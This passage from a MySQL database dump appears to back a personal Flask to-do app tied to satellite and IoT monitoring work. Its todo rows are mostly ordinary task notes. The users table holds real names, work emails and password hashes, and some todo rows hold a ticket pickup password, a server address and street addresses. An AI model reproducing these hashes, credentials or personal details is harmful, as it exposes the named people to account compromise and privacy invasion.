the status of remote terminals.',1,'yebin','2018-01-04 01:05:22'),(30,'小站监控增加定时发送按钮和主动发送按钮。',1,'yebin','2018-01-04 10:00:52'),(31,'微信发消息添加日志和待办。',0,'yebin','2018-01-04 10:02:47'),(32,'向远端站中增加数据库清理脚本',1,'yebin','2018-01-05 00:45:14'),(33,'为”http://111.47.20.166:8888/“增加登录认证功能（Flask）',1,'yebin','2018-01-05 01:18:29'),(34,'influx may need openvpn',1,'yebin','2018-01-05 01:46:35'),(35,'将todo改为socketio',1,'yebin','2018-01-06 00:27:08'),(36,'mqtt 和influx通过设备id添加识别设备',1,'yebin','2018-01-06 00:28:01'),(37,'去掉telegraf系统的用户授权，通过flask实现。',1,'yebin','2018-01-06 01:58:15'),(38,'http://docs.thinger.io/',1,'yebin','2018-01-06 02:46:20'),(39,'钉钉webhook',1,'yebin','2018-01-06 03:21:20'),(40,'用测试手机号发起钉钉群聊，然后退群，用钉钉机器人的webhook发送报警信息。',1,'yebin','2018-01-06 09:45:19'),(41,'钉钉机器人 https://www.jianshu.com/p/418e4ffbb4e3',1,'yebin','2018-01-06 09:45:56'),(42,'服务器部署：http://docs.thinger.io/deployment/',1,'yebin','2018-01-06 10:01:49'),(43,'zabbix opensource ?',1,'yebin','2018-01-07 15:45:31'),(44,'heartbeat socket to confirm client\'s online',1,'yebin','2018-01-09 12:32:23'),(45,'backup server database',1,'yebin','2018-01-10 02:49:15'),(46,'backup client\'s scripts',1,'yebin','2018-01-10 02:49:30'),(47,'增加一个发送邮件的脚本，用于客户端以及服务器的终端下发送邮件。',1,'yebin','2018-01-10 07:29:01'),(48,'联系海康，邮件内容不对。',1,'yebin','2018-01-10 13:24:15'),(49,'停掉chat服务，将某些服务做合并，以减小系统内存开销。',1,'yebin','2018-01-10 13:25:41'),(50,'将消息合并导出为一个文本文件，发送文本文件附件到邮箱和机器人。',1,'yebin','2018-01-10 23:10:24'),(51,'增加个人财务模块',0,'yebin','2018-01-11 07:12:28'),(52,'请李老师帮忙拿学位证。',1,'yebin','2018-01-15 01:19:38'),(53,'传感器上线。',1,'yebin','2018-01-15 01:20:15'),(54,'金山摄像机接口板焊接。',1,'yebin','2018-01-15 01:21:52'),(55,'写年终总结。',1,'yebin','2018-01-15 01:22:19'),(56,'给每个每小时生成的终端状态的文件名加上时间',1,'yebin','2018-01-17 22:53:29'),(57,'用nodered调试警报测试设备传感器温度。',1,'yebin','2018-01-18 00:56:28'),(58,'每个终端用git备份脚本',1,'yebin','2018-01-18 04:56:05'),(59,'去维修点调试摄像机',1,'yebin','2018-01-18 09:54:07'),(60,'每生成一个终端状态的文件，就复制到另外一个文件夹，原文件夹内只留一周的文件。',1,'yebin','2018-01-19 16:36:07'),(61,'合并satelc服务，增加https。',1,'yebin','2018-01-21 23:49:02'),(62,'增加用户扫码开通卫星通信的功能',0,'yebin','2018-01-22 00:28:00'),(63,'周三下午1点30分到静安民防维护。',1,'yebin','2018-01-22 09:02:39'),(64,'证书过期，暂时搁置。',0,'yebin','2018-01-23 10:18:30'),(65,'用paramiko操作minicom',0,'yebin','2018-01-23 10:20:41'),(66,'用单片机控制插座。',0,'yebin','2018-01-23 10:43:07'),(67,'更换灯泡',1,'yebin','2018-01-23 10:59:44'),(68,'增加用户组',1,'yebin','2018-01-23 11:14:46'),(69,'番禺路326号',1,'yebin','2018-01-23 12:07:00'),(70,'东兰路288号1号楼201',1,'yebin','2018-01-23 12:14:39'),(71,'真光路1288号',1,'yebin','2018-01-23 12:19:08'),(72,'wrap flask web app into local ios app',0,'yebin','2018-01-24 03:04:34'),(73,'write temperature generated time to database',1,'yebin','2018-01-24 07:21:01'),(74,'send real temperature data to web use socketio',1,'yebin','2018-01-24 07:21:27'),(75,'learn flask session.get() function',0,'yebin','2018-01-24 07:24:22'),(76,'问翟工发电机保养事宜，姚经理要求的预付款具体是多少。',1,'yebin','2018-01-24 09:42:27'),(77,'js: parseFloat() change color when alert',1,'yebin','2018-01-24 10:31:07'),(78,'backup todo database ',1,'yebin','2018-01-24 10:31:53'),(79,'bootstrap blog view ui',1,'yebin','2018-01-24 10:32:20'),(80,'龙华中路759号B1',1,'yebin','2018-01-24 12:07:24'),(81,'网页上修改温度预警阀值',1,'yebin','2018-01-24 23:03:30'),(82,'建行信用卡到期',1,'yebin','2018-01-25 00:06:02'),(83,'将http post方式改为mqtt模式',1,'yebin','2018-01-25 00:06:29'),(84,'备份代码到网盘（http post和chat without session control）',1,'yebin','2018-01-25 00:07:31'),(85,'已经联系翟工发送协议',1,'yebin','2018-01-25 07:51:48'),(86,'use “session.pop(\'user\', None)” before login',0,'yebin','2018-01-26 02:15:31'),(87,'use g before request: g.user = None if \'user\' in session: g.user = session[\'user\'], then, if g.user: ... else return login',0,'yebin','2018-01-26 02:16:47'),(88,'打款给翟工->崇明发电机保养',1,'yebin','2018-01-29 09:01:41'),(89,'淮安民防验收',1,'yebin','2018-01-29 09:02:14'),(90,'95588 - 1557.3',1,'yebin','2018-01-29 09:28:40'),(91,'【铁友网】2018年01月31日13:30南京汽车客运站(小红山站)—楚州，座位号2。取票号7010606，密码684524。',1,'yebin','2018-01-30 00:55:59'),(92,'已购1月31日JB3357次(座位2,门号27)开往楚州,南京汽车客运站13:30开,取票号7010606取票密码684524。【南京客运】',1,'yebin','2018-01-30 00:56:41'),(93,'【铁路客服】订单EA27952431,叶彬您已购1月31日G7008次10车15F号,上海站10:00开。',1,'yebin','2018-01-30 00:57:04'),(94,'宝山信号差、南汇吸盘和周浦发射机。',0,'yebin','2018-01-30 02:04:20'),(95,'核对功能演示ppt',1,'yebin','2018-01-30 09:42:52'),(96,'取钱，9个信封，每个信封1000元（评审费）',1,'yebin','2018-01-30 09:43:07'),(97,'找严科长签字盖章',1,'yebin','2018-01-30 09:43:36'),(98,'正本打印蛇纹封面胶装并标记正本, 复印8本',1,'yebin','2018-01-30 09:43:48'),(99,'P205、P213、P242 需要补人防办的公章',1,'yebin','2018-01-30 09:44:03'),(100,'其中，P242 培训签名表（让严科长找其他同事帮忙签字）',1,'yebin','2018-01-30 09:44:09'),(101,'《开工申请审批表》项目经理与严确认，《阶段性测试验收报审表》《设备变更申请表》三份表格交给严科长和田教授，其中一份已经插入终验资料，三份表格都要签字盖章',1,'yebin','2018-01-30 09:44:56'),(102,'P205、P213、P242 需要补人防办的公章',1,'yebin','2018-01-30 09:45:06'),(103,'2018年1月31日至2018年2月2日淮安出差',0,'yebin','2018-02-02 06:27:34'),(104,'Restructure Code - http://exploreflask.com/en/latest/',1,'yebin','2018-02-05 01:17:54'),(105,'blueprints, sesssion control, flask_sqlalchemy',1,'yebin','2018-02-06 07:08:55'),(106,'Confirm spending of client last year.',1,'yebin','2018-02-08 09:15:10'),(107,'年后给虹口、静安、长宁和金山做发电机保养。',0,'yebin','2018-02-09 08:16:46'),(108,'金山摄像机待取回',0,'yebin','2018-02-09 08:17:17'),(109,'长宁10-12月的维护单',0,'yebin','2018-02-09 08:17:48'),(110,'把小站状态写入模块移除socketio',1,'yebin','2018-02-11 00:04:28'),(111,'Just tell us what you don\'t like, the rest is what you are interested in.',0,'yebin','2018-02-11 00:34:29'),(112,'将虚拟环境移出log项目至根目录。',1,'yebin','2018-02-12 03:19:36'),(113,'调整chat.routes.py中index中的get方法的逻辑顺序。',1,'yebin','2018-02-19 10:03:54'),(114,'备份systemctrl service脚本',1,'yebin','2018-02-23 09:38:46'),(115,'数据库表中id自增重置',1,'yebin','2018-02-23 09:39:50'),(116,'增加防止chat注入式攻击脚本',1,'yebin','2018-02-23 09:40:33'),(117,'完善chat UI',1,'yebin','2018-02-23 09:40:49'),(118,'tensor flow & gsm to server to pi',0,'yebin','2018-02-25 03:39:23'),(119,'日志增加标题，默认标题为日期，可修改。',1,'yebin','2018-02-25 03:39:38'),(120,'使用一个虚拟环境，考虑用mqtt协议发送数据。',1,'yebin','2018-02-25 03:39:56'),(121,'每提交一次日志就发送一封邮件到邮箱',0,'yebin','2018-02-25 03:40:22'),(122,'海康摄像机取回待定',0,'yebin','2018-02-27 09:24:14'),(123,'新收监发射机厂家安装时间待定',1,'yebin','2018-02-27 09:24:28'),(124,'定期清状态和温度空数据库',1,'yebin','2018-02-27 23:06:35'),(125,'恢复邮件和消息推送',1,'yebin','2018-02-27 23:22:57'),(126,'把清空数据库的操作合并为一个服务',1,'yebin','2018-02-28 00:18:02'),(127,'每帧2048个数据点 每秒20帧',0,'yebin','2018-02-28 00:27:49'),(128,'远程管理点击连接后隐藏登录界面',0,'yebin','2018-02-28 00:56:40'),(129,'扫码远程开启猫和功放',0,'yebin','2018-02-28 05:26:07'),(130,'补两份120工单，3月中旬前维护。',0,'yebin','2018-02-28 06:09:24'),(131,'虹口民防下周发电机保养',0,'yebin','2018-02-28 09:39:56'),(132,'hxwulian git ignore',1,'yebin','2018-03-01 05:47:49'),(133,'paho mqtt do not store in mysql',1,'yebin','2018-03-01 05:48:31'),(134,'先查看mqtt和telegraf的资源占用情况，再考虑安装启用。',1,'yebin','2018-03-01 06:12:35'),(135,'代办列表文本靠左',1,'yebin','2018-03-02 00:20:59'),(136,'卫星频谱资源的智能划分，系统集成分系统的人工智能方案生成，卫星载波直接传输到服务器。',0,'yebin','2018-03-02 00:22:48'),(137,'python influxdb query string generate before using',1,'yebin','2018-03-02 10:06:44'),(138,'修改influxdb retension policies',1,'yebin','2018-03-04 23:51:43'),(139,'当数据库更新时，重启 influxdb, storestatus and storetemp。',1,'yebin','2018-03-05 02:45:54'),(140,'重启用wssh服务',0,'yebin','2018-03-05 10:07:33');
/*!40000 ALTER TABLE `todo` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `users`
--

DROP TABLE IF EXISTS `users`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `users` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `name` varchar(100) DEFAULT NULL,
  `email` varchar(100) DEFAULT NULL,
  `username` varchar(30) NOT NULL,
  `password` varchar(100) DEFAULT NULL,
  `register_date` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP,
  PRIMARY KEY (`id`),
  UNIQUE KEY `username` (`username`)
) ENGINE=InnoDB AUTO_INCREMENT=6 DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `users`
--

LOCK TABLES `users` WRITE;
/*!40000 ALTER TABLE `users` DISABLE KEYS */;
INSERT INTO `users` VALUES (1,'叶彬','yebin@satelc.com','admin','$5$rounds=535000$be.HH4OImr56mMfF$qz8QPlNa8ZT/QCXKhhKZoVZ5zlT3ZjAJ65E0AeIAXHD','2017-11-11 16:33:07'),(2,'叶彬','yebin@satelc.com','yebin','$5$rounds=535000$RiEzlUYbqPOYcCNd$n9ZjuA0skG.nmDSjoxWeMsaV568uQmZiFVgbhsINvk9','2017-11-11 16:33:34'),(3,'赵冬梅','zhaodongmei@satelc.com','zhaodongmei','$5$rounds=535000$HY8OxXwGfDqI.gXK$PyGM7JnXZ0bsjJwF3aYeUpYOiZ.ltyyEzXchbqMBsd.','2017-11-16 06:07:12'),(4,'高建','gaojian@satelc.com','gaojian','$5$rounds=535000$ZGMPWF0veXNR3GIb$uWGvlEoFR/jH7QI.N2CN7yOz1vK1XdXobiY9cSRF5tA','2017-11-16 06:08:11'),(5,'高玉广','gaoyuguang@satelc.com','gaoyuguang','$5$rounds=535000$B986XCwA/XdQlSik$Wgl8R486bOSde1VlHADh4ZKmF3vseh9LmnR2eCMbVdC','2017-11-16 06:09:26');
/*!40000 ALTER TABLE `users` ENABLE KEYS */;
UNLOCK TABLES;
/*!40103 SET TIME_ZONE=@OLD_TIME_ZONE */;

/*!40101 SET SQL_MODE=@OLD_SQL_MODE */;
/*!40014 SET FOREIGN_KEY_CHECKS=@OLD_FOREIGN_KEY_CHECKS */;
/*!40014 SET UNIQUE_CHECKS=@OLD_UNIQUE_CHECKS */;
/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
/*!40111 SET SQL_NOTES=@OLD_SQL_NOTES */;

-- Dump completed on 2018-03-07 15:12:12
